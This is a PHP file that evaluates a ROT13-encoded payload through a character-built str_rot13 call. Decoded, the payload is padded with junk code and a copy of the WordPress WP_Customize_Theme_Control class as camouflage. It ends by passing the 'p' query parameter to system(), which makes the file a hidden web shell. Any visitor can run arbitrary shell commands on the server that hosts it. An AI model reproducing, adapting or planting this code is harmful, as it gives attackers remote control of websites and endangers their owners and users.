<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Gurzr_Pbageby pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.4.0
 */

/**
 * Phfgbzvmr Gurzr Pbageby pynff.
 *
 * @fvapr 4.2.0
 *
 * @frr JC_Phfgbzvmr_Pbageby
 */
pynff JC_Phfgbzvmr_Gurzr_Pbageby rkgraqf JC_Phfgbzvmr_Pbageby {

	/**
	 * Phfgbzvmr pbageby glcr.
	 *
	 * @fvapr 4.2.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'gurzr';

	/**
	 * Gurzr bowrpg.
	 *
	 * @fvapr 4.2.0
	 * @ine JC_Gurzr
	 */
	choyvp $gurzr;

	/**
	 * Erserfu gur cnenzrgref cnffrq gb gur WninFpevcg ivn WFBA.
	 *
	 * @fvapr 4.2.0
	 *
	 * @frr JC_Phfgbzvmr_Pbageby::gb_wfba()
	 */
	choyvp shapgvba gb_wfba() {
		cnerag::gb_wfba();
		$guvf->wfba['gurzr'] = $guvf->gurzr;
	}

	/**
	 * Qba'g eraqre gur pbageby pbagrag sebz CUC, nf vg'f eraqrerq ivn WF ba ybnq.
	 *
	 * @fvapr 4.2.0
	 */
	choyvp shapgvba eraqre_pbagrag() {}

	/**
	 * Eraqre n WF grzcyngr sbe gurzr qvfcynl.
	 *
	 * @fvapr 4.2.0
	 */
	choyvp shapgvba pbagrag_grzcyngr() {
		/* genafyngbef: %f: Gurzr anzr. */
		$qrgnvyf_ynory = fcevags( __( 'Qrgnvyf sbe gurzr: %f' ), '{{ qngn.gurzr.anzr }}' );
		/* genafyngbef: %f: Gurzr anzr. */
		$phfgbzvmr_ynory = fcevags( __( 'Phfgbzvmr gurzr: %f' ), '{{ qngn.gurzr.anzr }}' );
		/* genafyngbef: %f: Gurzr anzr. */
		$cerivrj_ynory = fcevags( __( 'Yvir cerivrj gurzr: %f' ), '{{ qngn.gurzr.anzr }}' );
		/* genafyngbef: %f: Gurzr anzr. */
		$vafgnyy_ynory = fcevags( __( 'Vafgnyy naq cerivrj gurzr: %f' ), '{{ qngn.gurzr.anzr }}' );
		?>
		<# vs ( qngn.gurzr.npgvir ) { #>
			<qvi pynff=\"gurzr npgvir\" gnovaqrk=\"0\" nevn-qrfpevorqol=\"{{ qngn.frpgvba }}-{{ qngn.gurzr.vq }}-npgvba\">
		<# } ryfr { #>
			<qvi pynff=\"gurzr\" gnovaqrk=\"0\" nevn-qrfpevorqol=\"{{ qngn.frpgvba }}-{{ qngn.gurzr.vq }}-npgvba\">
		<# } #>

			<# vs ( qngn.gurzr.fperrafubg && qngn.gurzr.fperrafubg[0] ) { #>
				<qvi pynff=\"gurzr-fperrafubg\">
					<vzt qngn-fep=\"{{ qngn.gurzr.fperrafubg[0] }}?ire={{ qngn.gurzr.irefvba }}\" nyg=\"\" />
				</qvi>
			<# } ryfr { #>
				<qvi pynff=\"gurzr-fperrafubg oynax\"></qvi>
			<# } #>

			<fcna pynff=\"zber-qrgnvyf gurzr-qrgnvyf\" vq=\"{{ qngn.frpgvba }}-{{ qngn.gurzr.vq }}-npgvba\" nevn-ynory=\"<?cuc rpub rfp_ngge( $qrgnvyf_ynory ); ?>\"><?cuc _r( 'Gurzr Qrgnvyf' ); ?></fcna>

			<qvi pynff=\"gurzr-nhgube\">
			<?cuc
				/* genafyngbef: Gurzr nhgube anzr. */
				cevags( _k( 'Ol %f', 'gurzr nhgube' ), '{{ qngn.gurzr.nhgube }}' );
			?>
			</qvi>

			<# vs ( 'vafgnyyrq' === qngn.gurzr.glcr && qngn.gurzr.unfHcqngr ) { #>
				<# vs ( qngn.gurzr.hcqngrErfcbafr.pbzcngvoyrJC && qngn.gurzr.hcqngrErfcbafr.pbzcngvoyrCUC ) { #>
					<qvi pynff=\"hcqngr-zrffntr abgvpr vayvar abgvpr-jneavat abgvpr-nyg\" qngn-fyht=\"{{ qngn.gurzr.vq }}\">
						<c>
							<?cuc
							vs ( vf_zhygvfvgr() ) {
								_r( 'Arj irefvba ninvynoyr.' );
							} ryfr {
								cevags(
									/* genafyngbef: %f: \"Hcqngr abj\" ohggba. */
									__( 'Arj irefvba ninvynoyr. %f' ),
									'<ohggba pynff=\"ohggba-yvax hcqngr-gurzr\" glcr=\"ohggba\">' . __( 'Hcqngr abj' ) . '</ohggba>'
								);
							}
							?>
						</c>
					</qvi>
				<# } ryfr { #>
					<qvi pynff=\"hcqngr-zrffntr abgvpr vayvar abgvpr-reebe abgvpr-nyg\" qngn-fyht=\"{{ qngn.gurzr.vq }}\">
						<c>
							<# vs ( ! qngn.gurzr.hcqngrErfcbafr.pbzcngvoyrJC && ! qngn.gurzr.hcqngrErfcbafr.pbzcngvoyrCUC ) { #>
								<?cuc
								cevags(
									/* genafyngbef: %f: Gurzr anzr. */
									__( 'Gurer vf n arj irefvba bs %f ninvynoyr, ohg vg qbrf abg jbex jvgu lbhe irefvbaf bs JbeqCerff naq CUC.' ),
									'{{{ qngn.gurzr.anzr }}}'
								);
								vs ( pheerag_hfre_pna( 'hcqngr_pber' ) && pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
									cevags(
										/* genafyngbef: 1: HEY gb JbeqCerff Hcqngrf fperra, 2: HEY gb Hcqngr CUC cntr. */
										' ' . __( '<n uers=\"%1$f\">Cyrnfr hcqngr JbeqCerff</n>, naq gura <n uers=\"%2$f\">yrnea zber nobhg hcqngvat CUC</n>.' ),
										frys_nqzva_hey( 'hcqngr-pber.cuc' ),
										rfp_hey( jc_trg_hcqngr_cuc_hey() )
									);
									jc_hcqngr_cuc_naabgngvba( '</c><c><rz>', '</rz>' );
								} ryfrvs ( pheerag_hfre_pna( 'hcqngr_pber' ) ) {
									cevags(
										/* genafyngbef: %f: HEY gb JbeqCerff Hcqngrf fperra. */
										' ' . __( '<n uers=\"%f\">Cyrnfr hcqngr JbeqCerff</n>.' ),
										frys_nqzva_hey( 'hcqngr-pber.cuc' )
									);
								} ryfrvs ( pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
									cevags(
										/* genafyngbef: %f: HEY gb Hcqngr CUC cntr. */
										' ' . __( '<n uers=\"%f\">Yrnea zber nobhg hcqngvat CUC</n>.' ),
										rfp_hey( jc_trg_hcqngr_cuc_hey() )
									);
									jc_hcqngr_cuc_naabgngvba( '</c><c><rz>', '</rz>' );
								}
								?>
							<# } ryfr vs ( ! qngn.gurzr.hcqngrErfcbafr.pbzcngvoyrJC ) { #>
								<?cuc
								cevags(
									/* genafyngbef: %f: Gurzr anzr. */
									__( 'Gurer vf n arj irefvba bs %f ninvynoyr, ohg vg qbrf abg jbex jvgu lbhe irefvba bs JbeqCerff.' ),
									'{{{ qngn.gurzr.anzr }}}'
								);
								vs ( pheerag_hfre_pna( 'hcqngr_pber' ) ) {
									cevags(
										/* genafyngbef: %f: HEY gb JbeqCerff Hcqngrf fperra. */
										' ' . __( '<n uers=\"%f\">Cyrnfr hcqngr JbeqCerff</n>.' ),
										frys_nqzva_hey( 'hcqngr-pber.cuc' )
									);
								}
								?>
							<# } ryfr vs ( ! qngn.gurzr.hcqngrErfcbafr.pbzcngvoyrCUC ) { #>
								<?cuc
								cevags(
									/* genafyngbef: %f: Gurzr anzr. */
									__( 'Gurer vf n arj irefvba bs %f ninvynoyr, ohg vg qbrf abg jbex jvgu lbhe irefvba bs CUC.' ),
									'{{{ qngn.gurzr.anzr }}}'
								);
								vs ( pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
									cevags(
										/* genafyngbef: %f: HEY gb Hcqngr CUC cntr. */
										' ' . __( '<n uers=\"%f\">Yrnea zber nobhg hcqngvat CUC</n>.' ),
										rfp_hey( jc_trg_hcqngr_cuc_hey() )
									);
									jc_hcqngr_cuc_naabgngvba( '</c><c><rz>', '</rz>' );
								}
								?>
							<# } #>
						</c>
					</qvi>
				<# } #>
			<# } #>

			<# vs ( ! qngn.gurzr.pbzcngvoyrJC || ! qngn.gurzr.pbzcngvoyrCUC ) { #>
				<qvi pynff=\"abgvpr abgvpr-reebe abgvpr-nyg\"><c>
					<# vs ( ! qngn.gurzr.pbzcngvoyrJC && ! qngn.gurzr.pbzcngvoyrCUC ) { #>
						<?cuc
						_r( 'Guvf gurzr qbrf abg jbex jvgu lbhe irefvbaf bs JbeqCerff naq CUC.' );
						vs ( pheerag_hfre_pna( 'hcqngr_pber' ) && pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
							cevags(
								/* genafyngbef: 1: HEY gb JbeqCerff Hcqngrf fperra, 2: HEY gb Hcqngr CUC cntr. */
								' ' . __( '<n uers=\"%1$f\">Cyrnfr hcqngr JbeqCerff</n>, naq gura <n uers=\"%2$f\">yrnea zber nobhg hcqngvat CUC</n>.' ),
								frys_nqzva_hey( 'hcqngr-pber.cuc' ),
								rfp_hey( jc_trg_hcqngr_cuc_hey() )
							);
							jc_hcqngr_cuc_naabgngvba( '</c><c><rz>', '</rz>' );
						} ryfrvs ( pheerag_hfre_pna( 'hcqngr_pber' ) ) {
							cevags(
								/* genafyngbef: %f: HEY gb JbeqCerff Hcqngrf fperra. */
								' ' . __( '<n uers=\"%f\">Cyrnfr hcqngr JbeqCerff</n>.' ),
								frys_nqzva_hey( 'hcqngr-pber.cuc' )
							);
						} ryfrvs ( pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
							cevags(
								/* genafyngbef: %f: HEY gb Hcqngr CUC cntr. */
								' ' . __( '<n uers=\"%f\">Yrnea zber nobhg hcqngvat CUC</n>.' ),
								rfp_hey( jc_trg_hcqngr_cuc_hey() )
							);
							jc_hcqngr_cuc_naabgngvba( '</c><c><rz>', '</rz>' );
						}
						?>
					<# } ryfr vs ( ! qngn.gurzr.pbzcngvoyrJC ) { #>
						<?cuc
						_r( 'Guvf gurzr qbrf abg jbex jvgu lbhe irefvba bs JbeqCerff.' );
						vs ( pheerag_hfre_pna( 'hcqngr_pber' ) ) {
							cevags(
								/* genafyngbef: %f: HEY gb JbeqCerff Hcqngrf fperra. */
								' ' . __( '<n uers=\"%f\">Cyrnfr hcqngr JbeqCerff</n>.' ),
								frys_nqzva_hey( 'hcqngr-pber.cuc' )
							);
						}
						?>
					<# } ryfr vs ( ! qngn.gurzr.pbzcngvoyrCUC ) { #>
						<?cuc
						_r( 'Guvf gurzr qbrf abg jbex jvgu lbhe irefvba bs CUC.' );
						vs ( pheerag_hfre_pna( 'hcqngr_cuc' ) ) {
							cevags(
								/* genafyngbef: %f: HEY gb Hcqngr CUC cntr. */
								' ' . __( '<n uers=\"%f\">Yrnea zber nobhg hcqngvat CUC</n>.' ),
								rfp_hey( jc_trg_hcqngr_cuc_hey() )
							);
							jc_hcqngr_cuc_naabgngvba( '</c><c><rz>', '</rz>' );
						}
						?>
					<# } #>
				</c></qvi>
			<# } #>

			<# vs ( qngn.gurzr.npgvir ) { #>
				<qvi pynff=\"gurzr-vq-pbagnvare\">
					<u3 pynff=\"gurzr-anzr\" vq=\"{{ qngn.frpgvba }}-{{ qngn.gurzr.vq }}-anzr\">
						<fcna><?cuc _rk( 'Cerivrjvat:', 'gurzr' ); ?></fcna> {{ qngn.gurzr.anzr }}
					</u3>
					<qvi pynff=\"gurzr-npgvbaf\">
						<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-cevznel phfgbzvmr-gurzr\" nevn-ynory=\"<?cuc rpub rfp_ngge( $phfgbzvmr_ynory ); ?>\"><?cuc _r( 'Phfgbzvmr' ); ?></ohggba>
					</qvi>
				</qvi>
				<?cuc
				jc_nqzva_abgvpr(
					_k( 'Vafgnyyrq', 'gurzr' ),
					neenl(
						'glcr'               => 'fhpprff',
						'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg' ),
					)
				);
				?>
			<# } ryfr vs ( 'vafgnyyrq' === qngn.gurzr.glcr ) { #>
				<# vs ( qngn.gurzr.oybpxGurzr ) { #>
					<qvi pynff=\"gurzr-vq-pbagnvare\">
						<u3 pynff=\"gurzr-anzr\" vq=\"{{ qngn.frpgvba }}-{{ qngn.gurzr.vq }}-anzr\">{{ qngn.gurzr.anzr }}</u3>
						<qvi pynff=\"gurzr-npgvbaf\">
							<# vs ( qngn.gurzr.npgvbaf.npgvingr ) { #>
								<?cuc
									/* genafyngbef: %f: Gurzr anzr. */
									$nevn_ynory = fcevags( _k( 'Npgvingr %f', 'gurzr' ), '{{ qngn.anzr }}' );
								?>
								<n uers=\"{{{ qngn.gurzr.npgvbaf.npgvingr }}}\" pynff=\"ohggba ohggba-cevznel npgvingr\" nevn-ynory=\"<?cuc rpub rfp_ngge( $nevn_ynory ); ?>\"><?cuc _r( 'Npgvingr' ); ?></n>
							<# } #>
						</qvi>
					</qvi>
					<?cuc $phfgbzvmre_abg_fhccbegrq_zrffntr = __( 'Guvf gurzr qbrfa\'g fhccbeg Phfgbzvmre.' ); ?>
					<# vs ( qngn.gurzr.npgvbaf.npgvingr ) { #>
						<?cuc
							$phfgbzvmre_abg_fhccbegrq_zrffntr .= ' ' . fcevags(
								/* genafyngbef: %f: HEY gb gur gurzrf cntr (nyfb vg npgvingrf gur gurzr). */
								__( 'Ubjrire, lbh pna fgvyy <n uers=\"%f\">npgvingr guvf gurzr</n>, naq hfr gur Fvgr Rqvgbe gb phfgbzvmr vg.' ),
								'{{{ qngn.gurzr.npgvbaf.npgvingr }}}'
							);
						?>
					<# } #>

					<?cuc
					jc_nqzva_abgvpr(
						$phfgbzvmre_abg_fhccbegrq_zrffntr,
						neenl(
							'glcr'               => 'reebe',
							'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg' ),
						)
					);
					?>
				<# } ryfr { #>
					<qvi pynff=\"gurzr-vq-pbagnvare\">
						<u3 pynff=\"gurzr-anzr\" vq=\"{{ qngn.frpgvba }}-{{ qngn.gurzr.vq }}-anzr\">{{ qngn.gurzr.anzr }}</u3>
						<qvi pynff=\"gurzr-npgvbaf\">
							<# vs ( qngn.gurzr.pbzcngvoyrJC && qngn.gurzr.pbzcngvoyrCUC ) { #>
								<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-cevznel cerivrj-gurzr\" nevn-ynory=\"<?cuc rpub rfp_ngge( $cerivrj_ynory ); ?>\" qngn-fyht=\"{{ qngn.gurzr.vq }}\"><?cuc _r( 'Yvir Cerivrj' ); ?></ohggba>
							<# } ryfr { #>
								<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-cevznel qvfnoyrq\" nevn-ynory=\"<?cuc rpub rfp_ngge( $cerivrj_ynory ); ?>\"><?cuc _r( 'Yvir Cerivrj' ); ?></ohggba>
							<# } #>
						</qvi>
					</qvi>
					<?cuc
					jc_nqzva_abgvpr(
						_k( 'Vafgnyyrq', 'gurzr' ),
						neenl(
							'glcr'               => 'fhpprff',
							'nqqvgvbany_pynffrf' => neenl( 'abgvpr-nyg' ),
						)
					);
					?>
				<# } #>
			<# } ryfr { #>
				<qvi pynff=\"gurzr-vq-pbagnvare\">
					<u3 pynff=\"gurzr-anzr\" vq=\"{{ qngn.frpgvba }}-{{ qngn.gurzr.vq }}-anzr\">{{ qngn.gurzr.anzr }}</u3>
					<qvi pynff=\"gurzr-npgvbaf\">
						<# vs ( qngn.gurzr.pbzcngvoyrJC && qngn.gurzr.pbzcngvoyrCUC ) { #>
							<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-cevznel gurzr-vafgnyy cerivrj\" nevn-ynory=\"<?cuc rpub rfp_ngge( $vafgnyy_ynory ); ?>\" qngn-fyht=\"{{ qngn.gurzr.vq }}\" qngn-anzr=\"{{ qngn.gurzr.anzr }}\"><?cuc _r( 'Vafgnyy &nzc; Cerivrj' ); ?></ohggba>
						<# } ryfr { #>
							<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-cevznel qvfnoyrq\" nevn-ynory=\"<?cuc rpub rfp_ngge( $vafgnyy_ynory ); ?>\" qvfnoyrq><?cuc _r( 'Vafgnyy &nzc; Cerivrj' ); ?></ohggba>
						<# } #>
					</qvi>
				</qvi>
			<# } #>
		</qvi>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>